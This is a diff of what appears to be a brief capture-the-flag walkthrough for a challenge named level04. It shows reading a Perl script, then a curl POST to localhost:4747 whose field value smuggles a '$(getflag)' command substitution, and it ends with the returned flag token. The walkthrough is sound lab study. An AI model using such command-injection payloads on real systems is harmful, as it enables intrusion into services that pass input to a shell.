@@ -1,1 +1,4 @@
-curl -X POST -d 'x=$(getflag)' localhost:4747
+🔻 Hack
+⬇️ cat level04.pl
+⬇️ curl -X POST -d 'x=$(getflag)' localhost:4747
+👉 Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap 
